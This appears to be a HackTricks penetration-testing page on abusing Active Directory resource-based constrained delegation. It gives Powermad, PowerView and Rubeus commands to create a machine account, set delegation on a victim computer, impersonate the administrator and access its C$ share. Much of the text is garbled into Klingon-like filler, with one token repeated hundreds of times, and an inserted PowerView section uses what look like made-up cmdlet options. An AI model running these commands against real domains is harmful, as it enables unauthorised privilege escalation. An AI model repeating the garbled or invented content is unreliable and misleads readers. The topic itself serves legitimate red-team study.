# Resource-based Constrained Delegation

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basics of Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.

Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).

### New Concepts

Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.

However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).

### Attack structure

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Suppose that the attacker has already **write equivalent privileges over the victim computer**.

1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.

To check the _**MachineAccountQuota**_ of the domain you can use:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## tIq

### Computer Object yI'el

[Powermad](https://github.com/Kevin-Robertson/Powermad)**:** vItlhutlh. yI'el domainDaq Computer Object.
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation** **jIHDaq QaD**

**activedirectory PowerShell module** **vaj activedirectory PowerShell module**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**ghItlhvam powerview**

**Introduction**

Powerview is a powerful PowerShell tool that allows you to interact with Active Directory (AD) environments. It provides a wide range of functionalities for enumeration, exploitation, and post-exploitation activities. In this section, we will explore how to use Powerview for resource-based constrained delegation attacks.

**Understanding Resource-Based Constrained Delegation**

Resource-Based Constrained Delegation (RBCD) is a feature in AD that allows a user to delegate their access rights to a specific resource, such as a service account or a computer object. This delegation can be limited to specific actions or permissions, providing granular control over the delegated access.

**Enumerating Resource-Based Constrained Delegation**

To enumerate the resource-based constrained delegation settings in an AD environment, you can use the `Get-DomainUser` cmdlet in Powerview. This cmdlet retrieves information about user accounts in the domain, including their delegation settings.

```powershell
Get-DomainUser -Delegation
```

**Exploiting Resource-Based Constrained Delegation**

Once you have identified a user account with resource-based constrained delegation enabled, you can exploit it to gain unauthorized access to other resources in the AD environment. This can be done by abusing the Kerberos protocol and impersonating the user account.

To exploit resource-based constrained delegation, you can use the `Invoke-UserImpersonation` cmdlet in Powerview. This cmdlet allows you to impersonate a user account and request a Kerberos ticket for a specific service.

```powershell
Invoke-UserImpersonation -TargetUser <username> -TargetService <service>
```

Replace `<username>` with the name of the user account you want to impersonate and `<service>` with the name of the target service you want to access.

**Post-Exploitation Activities**

Once you have successfully exploited resource-based constrained delegation, you can perform various post-exploitation activities, such as lateral movement, privilege escalation, and data exfiltration. Powerview provides several cmdlets that can help you in these activities.

For example, you can use the `Invoke-ShareFinder` cmdlet to find accessible file shares in the AD environment.

```powershell
Invoke-ShareFinder
```

You can also use the `Invoke-FileFinder` cmdlet to search for specific files in the AD environment.

```powershell
Invoke-FileFinder -Path <path> -Pattern <pattern>
```

Replace `<path>` with the directory path you want to search in and `<pattern>` with the file pattern you want to search for.

**Conclusion**

Resource-Based Constrained Delegation is a powerful feature in AD that can be exploited for unauthorized access to resources. Powerview provides a convenient and effective way to enumerate, exploit, and perform post-exploitation activities related to resource-based constrained delegation.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### S4U attack jImej

ghItlhvam, chenmoHwI' Computer be'Hom vItlhutlh `123456` password, vaj vaj hash vItlhutlh:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
**DaH jImej RC4 je AES hashmeywI' 'e' vItlhutlh.\
vaj, tInmoHbe'chugh vItlhutlh:**
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
**Translation:**

```
Rubeus jatlh `/altservice` param jImej vItlhutlhlaHbe'chugh, vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh, vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Qapla'! users vItlhutlh **Cannot be delegated** DaH jImej. Qapla'! user vItlhutlh True, vaj vay' vItlhutlh impersonate. Qapla'! property bloodhound DaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDa
```bash
ls \\victim.domain.local\C$
```
### Abuse different service tickets

Lear about the [**available service tickets here**](silver-ticket.md#available-services).

## Kerberos Errors

* **`KDC_ERR_ETYPE_NOTSUPP`**: tlhIngan Hol vItlhutlh. kerberos vItlhutlh DES qar'a'wI' qar'a'wI' RC4 'ej rc4 hash vItlhutlh. Rubeus vItlhutlh AES256 hash (be' 'ej rc4, aes128 'ej aes256 hash) Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: tlhIngan Hol vItlhutlh. vItlhutlh computer time vItlhutlh DC 'ej kerberos vItlhutlh.
* **`preauth_failed`**: tlhIngan Hol vItlhutlh. username + hashes vItlhutlh login vItlhutlh. username hashes vItlhutlh (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`) vItlhutlh "$" vItlhutlh.
* **`KDC_ERR_BADOPTION`**: tlhIngan Hol vItlhutlh:
* vItlhutlh user vItlhutlh impersonate vItlhutlh service vItlhutlh (vItlhutlh impersonate vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh)
* vItlhutlh service vItlhutlh (winrm vItlhutlh ticket vItlhutlh)
* fakecomputer vItlhutlh vulnerable server vItlhutlh vItlhutlh vItlhutlh.

## References

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
